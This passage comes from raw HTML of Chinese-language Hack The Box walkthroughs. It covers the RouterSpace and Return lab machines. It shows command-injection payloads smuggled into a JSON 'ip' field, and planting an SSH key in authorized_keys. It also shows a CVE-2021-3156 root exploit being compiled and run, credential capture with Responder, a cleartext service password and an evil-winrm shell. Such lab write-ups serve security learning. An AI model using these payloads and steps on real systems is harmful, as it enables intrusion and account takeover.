class="hljs-punctuation">:</span><span class="hljs-string">&quot;10.10.11.148|cat /home/paul/user.txt&quot;</span><span class="hljs-punctuation">&#125;</span></span><br></code></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">X-Powered-By</span><span class="hljs-punctuation">: </span>RouterSpace<br><span class="hljs-attribute">X-Cdn</span><span class="hljs-punctuation">: </span>RouterSpace-96428<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json; charset=utf-8<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>36<br><span class="hljs-attribute">ETag</span><span class="hljs-punctuation">: </span>W/&quot;24-lTLAHWrUaSZIdUqQw/W1+pAETwQ&quot;<br><span class="hljs-attribute">Date</span><span class="hljs-punctuation">: </span>Tue, 07 Jun 2022 06:01:06 GMT<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-lsl"><span class="hljs-string">&quot;e81eb.......................<span class="hljs-subst">\n</span>&quot;</span></span><br></code></pre></td></tr></table></figure><p>可以检测一下对目标.ssh有没有写入权限，如果有就写一个ssh公钥进去。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/api/v4/monitoring/router/dev/check/deviceAccess</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">accept</span><span class="hljs-punctuation">: </span>application/json, text/plain, */*<br><span class="hljs-attribute">user-agent</span><span class="hljs-punctuation">: </span>RouterSpaceAgent<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>70<br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>routerspace.htb<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><br><span class="language-json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;ip&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;10.10.11.148|echo &#x27;can you see me&#x27;&gt;/home/paul/.ssh/lalala.txt&quot;</span><span class="hljs-punctuation">&#125;</span></span><br></code></pre></td></tr></table></figure><p>再尝试读取：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/api/v4/monitoring/router/dev/check/deviceAccess</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">accept</span><span class="hljs-punctuation">: </span>application/json, text/plain, */*<br><span class="hljs-attribute">user-agent</span><span class="hljs-punctuation">: </span>RouterSpaceAgent<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>52<br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>routerspace.htb<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><br><span class="language-json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;ip&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;10.10.11.148|cat /home/paul/.ssh/lalala.txt&quot;</span><span class="hljs-punctuation">&#125;</span></span><br></code></pre></td></tr></table></figure><p>成功：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">X-Powered-By</span><span class="hljs-punctuation">: </span>RouterSpace<br><span class="hljs-attribute">X-Cdn</span><span class="hljs-punctuation">: </span>RouterSpace-2174<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json; charset=utf-8<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>18<br><span class="hljs-attribute">ETag</span><span class="hljs-punctuation">: </span>W/&quot;12-a61DJ3xMkogTgauvzmPm708oxBw&quot;<br><span class="hljs-attribute">Date</span><span class="hljs-punctuation">: </span>Tue, 07 Jun 2022 06:05:17 GMT<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-lsl"><span class="hljs-string">&quot;can you see me<span class="hljs-subst">\n</span>&quot;</span></span><br></code></pre></td></tr></table></figure><p>写入公钥：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/api/v4/monitoring/router/dev/check/deviceAccess</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">accept</span><span class="hljs-punctuation">: </span>application/json, text/plain, */*<br><span class="hljs-attribute">user-agent</span><span class="hljs-punctuation">: </span>RouterSpaceAgent<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>633<br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>routerspace.htb<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><br><span class="language-subunit">&#123;&quot;ip&quot;:&quot;10.10.11.148|echo &#x27;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCyqnUh0fJARuOZYFpyflYrG34Gfl3i+rNCeySEYzy9Se<span class="hljs-string">+5</span>htiQyH2zc/HnTzYZP0hm<span class="hljs-string">+23</span>F0MoyKEGQ5Z1XW3RtP9/Nm67QkL/qB43Kw1kNX+i<span class="hljs-string">+8</span>eXG33lAFXXRhLv7ztMmQa/4LWY0esgtXGPvwKvWOK62X5XlW0wJKG/Deiydj+rGSTj3UMKxlvyEL7VAqxt9dO5OtdE5w5SD+vv+StYgZEleK+Z8eG3hHR/PaIJBvT02MEghh1D4VSNrSkencAj7D2GC2Kn2w<span class="hljs-string">+55</span>hgs2JKlaVRdoUoh1ZxaSkxluR5vcvOqZsBKpyZ5W0BMuSEDLqGwfgx/pN1jG7+VPbHzzPb9YayKFPkqxg+SwUV2+IgIbF6ZdUq8ebLXnuW1DVVVPMWFpMuOPTMF02M4T1w8mEs3vHoPwFVsaS5R02m14Rmh8hA9I30kNaWmRHUt4CU2T6kuzoT8IfvAaOIaxevJNC0I/fZjZhQHANJdGd4AfSun2mYBx6qBfDh9cnhDqAlphZzU= mosaic@ParrotMosaic&#x27;&gt;/home/paul/.ssh/authorized_keys&quot;&#125;</span><br></code></pre></td></tr></table></figure><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bat">ssh -i &quot;.\Desktop\id_rsa&quot; paul@<span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">11</span>.<span class="hljs-number">148</span><br></code></pre></td></tr></table></figure><p>提权漏洞有CVE-2021-3156，wget能使用，但是无法下载。不过可以手动将提权漏洞代码复制进去：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">paul@routerspace:~$ vim exploit.c<br>paul@routerspace:~$ vim shellcode.c<br>paul@routerspace:~$ vim Makefile<br>paul@routerspace:~$ make<br><span class="hljs-built_in">mkdir</span> libnss_x<br>cc -O3 -shared -nostdlib -o libnss_x/x.so.2 shellcode.c<br>cc -O3 -o exploit exploit.c<br>paul@routerspace:~$ <span class="hljs-built_in">ls</span><br>exploit  exploit.c  libnss_x  Makefile  shellcode.c  snap  user.txt<br>paul@routerspace:~$ ./exploit<br><span class="hljs-comment"># id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root),1001(paul)<br><span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Hack The Box</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB Walkthrough - Return</title>
    <link href="/post/HackTheBox-Return.html"/>
    <url>/post/HackTheBox-Return.html</url>
    
    <content type="html"><![CDATA[<h3 id="HTB-Walkthrough-Return"><a href="#HTB-Walkthrough-Return" class="headerlink" title="HTB Walkthrough - Return"></a>HTB Walkthrough - Return</h3><h4 id="Recon"><a href="#Recon" class="headerlink" title="Recon:"></a>Recon:</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs bash">Nmap scan report <span class="hljs-keyword">for</span> return.htb (10.10.11.108)<br>Host is up (0.36s latency).<br>Not shown: 65509 closed tcp ports (reset)<br>PORT      STATE SERVICE       VERSION<br>53/tcp    open  domain        Simple DNS Plus<br>80/tcp    open  http          Microsoft IIS httpd 10.0<br>|_http-server-header: Microsoft-IIS/10.0<br>| http-methods: <br>|_  Potentially risky methods: TRACE<br>|_http-title: HTB Printer Admin Panel<br>88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-05-15 14:51:01Z)<br>135/tcp   open  msrpc         Microsoft Windows RPC<br>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn<br>389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)<br>445/tcp   open  microsoft-ds?<br>464/tcp   open  kpasswd5?<br>593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0<br>636/tcp   open  tcpwrapped<br>3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)<br>3269/tcp  open  tcpwrapped<br>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)<br>|_http-server-header: Microsoft-HTTPAPI/2.0<br>|_http-title: Not Found<br>9389/tcp  open  mc-nmf        .NET Message Framing<br>47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)<br>|_http-server-header: Microsoft-HTTPAPI/2.0<br>|_http-title: Not Found<br>49664/tcp open  msrpc         Microsoft Windows RPC<br>49665/tcp open  msrpc         Microsoft Windows RPC<br>49666/tcp open  msrpc         Microsoft Windows RPC<br>49667/tcp open  msrpc         Microsoft Windows RPC<br>49671/tcp open  msrpc         Microsoft Windows RPC<br>49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0<br>49675/tcp open  msrpc         Microsoft Windows RPC<br>49679/tcp open  msrpc         Microsoft Windows RPC<br>49682/tcp open  msrpc         Microsoft Windows RPC<br>49690/tcp open  msrpc         Microsoft Windows RPC<br>49694/tcp open  msrpc         Microsoft Windows RPC<br>Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows<br><br>Host script results:<br>|_clock-skew: 18m34s<br>| smb2-time: <br>|   <span class="hljs-built_in">date</span>: 2022-05-15T14:52:00<br>|_  start_date: N/A<br>| smb2-security-mode: <br>|   3.1.1: <br>|_    Message signing enabled and required<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 857.68 seconds<br></code></pre></td></tr></table></figure><h4 id="Port-53"><a href="#Port-53" class="headerlink" title="Port 53:"></a>Port 53:</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; dig axfr @10.10.11.108 return.local<br><br>; &lt;&lt;&gt;&gt; DiG 9.18.1-1-Debian &lt;&lt;&gt;&gt; axfr @10.10.11.108 return.local<br>; (1 server found)<br>;; global options: +cmd<br>; Transfer failed.<br></code></pre></td></tr></table></figure><h4 id="Port-80"><a href="#Port-80" class="headerlink" title="Port 80 :"></a>Port 80 :</h4><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220515220255032.png" alt="image-20220515220255032"  /><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220515220756621.png" alt="image-20220515220756621"  /><p>密码我试着改，没成功提示也没返回提示，而我输入的是五个字符admin，提交之后变成了7个*，不过是用PHP开发的WEB管理页面：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/settings.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>return.htb<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>23<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://return.htb<br><span class="hljs-attribute">DNT</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://return.htb/settings.php<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><br><span class="language-abnf"><span class="hljs-attribute">ip</span><span class="hljs-operator">=</span>printer.return.local</span><br></code></pre></td></tr></table></figure><p>我提交的密码并不会出现在数据包中，我可以尝试把IP改成自己的，然后开启嗅探：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; sudo responder -I tun0            <br>                                         __<br>  .----.-----.-----.-----.-----.-----.--|  |.-----.----.<br>  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|<br>  |__| |_____|_____|   __|_____|__|__|_____||_____|__|<br>                   |__|<br><br>           NBT-NS, LLMNR &amp; MDNS Responder 3.1.1.0<br><br>  Author: Laurent Gaffie (laurent.gaffie@gmail.com)<br>  To <span class="hljs-built_in">kill</span> this script hit CTRL-C<br>[+] Generic Options:<br>    Responder NIC              [tun0]<br>    Responder IP               [10.10.16.6]<br>    Responder IPv6             [dead:beef:4::1004]<br>    Challenge <span class="hljs-built_in">set</span>              [random]<br>    Don<span class="hljs-string">&#x27;t Respond To Names     [&#x27;</span>ISATAP<span class="hljs-string">&#x27;]</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Listening for events...</span><br></code></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220515230220445.png" alt="image-20220515230220445"  /><h4 id="Port-139-445："><a href="#Port-139-445：" class="headerlink" title="Port 139,445："></a>Port 139,445：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; crackmapexec smb 10.10.11.108 --shares -u svc-printer -p <span class="hljs-string">&#x27;1edFg43012!!&#x27;</span><br>SMB         10.10.11.108    445    PRINTER          [*] Windows 10.0 Build 17763 x64 (name:PRINTER) (domain:return.local) (signing:True) (SMBv1:False)<br>SMB         10.10.11.108    445    PRINTER          [+] return.local\svc-printer:1edFg43012!! <br>SMB         10.10.11.108    445    PRINTER          [+] Enumerated shares<br>SMB         10.10.11.108    445    PRINTER          Share           Permissions     Remark<br>SMB         10.10.11.108    445    PRINTER          -----           -----------     ------<br>SMB         10.10.11.108    445    PRINTER          ADMIN$          READ            Remote Admin<br>SMB         10.10.11.108    445    PRINTER          C$              READ,WRITE      Default share<br>SMB         10.10.11.108    445    PRINTER          IPC$            READ            Remote IPC<br>SMB         10.10.11.108    445    PRINTER          NETLOGON        READ            Logon server share <br>SMB         10.10.11.108    445    PRINTER          SYSVOL          READ            Logon server share <br></code></pre></td></tr></table></figure><p>都是默认共享。</p><h4 id="Port-135"><a href="#Port-135" class="headerlink" title="Port 135:"></a>Port 135:</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; rpcclient //10.10.11.108/ -U svc-printer<br>Cannot connect to server.  Error was NT_STATUS_UNSUCCESSFUL<br></code></pre></td></tr></table></figure><p>Rpc不让连。</p><h4 id="Port-5985："><a href="#Port-5985：" class="headerlink" title="Port 5985："></a>Port 5985：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; crackmapexec winrm 10.10.11.108 -u svc-printer -p <span class="hljs-string">&#x27;1edFg43012!!&#x27;</span> <br>SMB         10.10.11.108    5985   PRINTER          [*] Windows 10.0 Build 17763 (name:PRINTER) (domain:return.local)<br>HTTP        10.10.11.108    5985   PRINTER          [*] http://10.10.11.108:5985/wsman<br>WINRM       10.10.11.108    5985   PRINTER          [+] return.local\svc-printer:1edFg43012!! (Pwn3d!)<br></code></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs powershell">&gt;&gt; evil<span class="hljs-literal">-winrm</span> <span class="hljs-literal">-i</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">11.108</span> <span class="hljs-literal">-u</span> svc<span class="hljs-literal">-printer</span> <span class="hljs-literal">-p</span> <span class="hljs-string">&#x27;1edFg43012!!&#x27;</span><br><br>Evil<span class="hljs-literal">-WinRM</span> shell v3.<span class="hljs-number">3</span><br><br>Info: Establishing connection to remote endpoint<br><br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\svc<span class="hljs-literal">-printer</span>\Documents&gt; <span class="hljs-built_in">cd</span> ~<br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\svc<span class="hljs-literal">-printer</span>&gt; <span class="hljs-built_in">ls</span><br><br>    Directory: C:\Users\svc<span class="hljs-literal">-printer</span><br>    <br>Mode                LastWriteTime         Length Name<br><span class="hljs-literal">----</span>                <span class="hljs-literal">-------------</span>         <span class="hljs-literal">------</span> <span class="hljs-literal">----</span><br>d<span class="hljs-literal">-r---</span>        <span class="hljs-number">5</span>/<span class="hljs-number">26</span>/<span class="hljs-number">2021</span>   <span class="hljs-number">2</span>:<span class="hljs-number">05</span> AM                Desktop<br>d<span class="hljs-literal">-r---</span>        <span class="hljs-number">5</span>/<span class="hljs-number">26</span>/<span class="hljs-number">2021</span>   <span class="hljs-number">1</span>:<span class="hljs-number">51</span> AM                Documents<br>d<span class="hljs-literal">-r---</span>        <span class="hljs-number">9</span>/<span class="hljs-number">15</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">12</span>:<span class="hljs-number">19</span> AM                Downloads<br>d<span class="hljs-literal">-r---</span>        <span class="hljs-number">9</span>/<span class="hljs-number">15</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">12</span>:<span class="hljs-number">19</span> AM                Favorites<br>d<span class="hljs-literal">-r---</span>        <span class="hljs-number">9</span>/<span class="hljs-number">15</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">12</span>:<span class="hljs-number">19</span> AM                Links<br>d<span class="hljs-literal">-r---</span>        <span class="hljs-number">9</span>/<span class="hljs-number">15</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">12</span>:<span class="hljs-number">19</span> AM                Music<br>d<span class="hljs-literal">-r---</span>        <span class="hljs-number">9</span>/<span class="hljs-number">15</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">12</span>:<span class="hljs-number">19</span> AM                Pictures<br>d<span class="hljs-literal">-----</span>        <span class="hljs-number">9</span>/<span class="hljs-number">15</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">12</span>:<span class="hljs-number">19</span> AM                Saved Games<br>d<span class="hljs-literal">-r---</span>        <span class="hljs-number">9</span>/<span class="hljs-number">15</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">12</span>:<span class="hljs-number">19</span> AM                Videos<br><br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\svc<span class="hljs-literal">-printer</span>&gt; <span class="hljs-built_in">cd</span> Desktop<br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\svc<span class="hljs-literal">-printer</span>\Desktop&gt; <span class="hljs-built_in">ls</span><br><br>    Directory: C:\Users\svc<span class="hljs-literal">-printer</span>\Desktop<br><br><br>Mode                LastWriteTime         Length Name<br><span class="hljs-literal">----</span>                <span class="hljs-literal">-------------</span>         <span class="hljs-literal">------</span> <span class="hljs-literal">----</span><br><span class="hljs-literal">-ar---</span>        <span class="hljs-number">5</span>/<span class="hljs-number">15</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">8</span>:<span class="hljs-number">29</span> AM             <span class="hljs-number">34</span> user.txt<br><br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\svc<span class="hljs-literal">-printer</span>\Desktop&gt; <span class="hljs-built_in">type</span> user.txt<br>fe9...............................<br></code></pre></td></tr></table></figure><p>这账户权限很高，加载恶意驱动，备份转储哈希：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs powershell">*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\svc<span class="hljs-literal">-printer</span>\Desktop&gt; whoami /priv<br><br>PRIVILEGES INFORMATION<br><span class="hljs-literal">----------------------</span><br><br>Privilege Name                Description                         State<br>============================= =================================== =======<br>SeMachineAccountPrivilege     Add workstations to domain          Enabled<br>SeLoadDriverPrivilege         Load and unload device drivers      Enabled<br>SeSystemtimePrivilege         Change the system time              Enabled<br>SeBackupPrivilege             Back up files and directories       Enabled<br>SeRestorePrivilege            Restore files and directories       Enabled<br>SeShutdownPrivilege           Shut down the system                Enabled<br>SeChangeNotifyPrivilege       Bypass traverse checking            Enabled<br>SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled<br>SeIncreaseWorkingSetPrivilege Increase a <span class="hljs-keyword">process</span> working <span class="hljs-built_in">set</span>      Enabled<br>SeTimeZonePrivilege           Change the time zone                Enabled<br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\svc<span class="hljs-literal">-printer</span>\Desktop&gt; <br></code></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs powershell">*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\svc<span class="hljs-literal">-printer</span>\Desktop&gt; whoami /groups<br><br><span class="hljs-built_in">GROUP</span> INFORMATION<br><span class="hljs-literal">-----------------</span><br><br><span class="hljs-built_in">Group</span> Name                                 <span class="hljs-built_in">Type</span>             SID          Attributes<br>========================================== ================ ============ ==================================================<br>Everyone                                   Well<span class="hljs-literal">-known</span> <span class="hljs-built_in">group</span> S<span class="hljs-literal">-1-1-0</span>      Mandatory <span class="hljs-built_in">group</span>, Enabled by default, Enabled <span class="hljs-built_in">group</span><br>BUILTIN\Server Operators                   Alias            S<span class="hljs-literal">-1-5-32-549</span> Mandatory <span class="hljs-built_in">group</span>, Enabled by default, Enabled <span class="hljs-built_in">group</span><br>BUILTIN\Print Operators                    Alias            S<span class="hljs-literal">-1-5-32-550</span> Mandatory <span class="hljs-built_in">group</span>, Enabled by default, Enabled <span class="hljs-built_in">group</span><br>BUILTIN\Remote Management Users            Alias            S<span class="hljs-literal">-1-5-32-580</span> Mandatory <span class="hljs-built_in">group</span>, Enabled by default, Enabled <span class="hljs-built_in">group</span><br>BUILTIN\Users                              Alias            S<span class="hljs-literal">-1-5-32-545</span> Mandatory <span class="hljs-built_in">group</span>, Enabled by default, Enabled <span class="hljs-built_in">group</span><br>BUILTIN\Pre<span class="hljs-literal">-Windows</span> <span 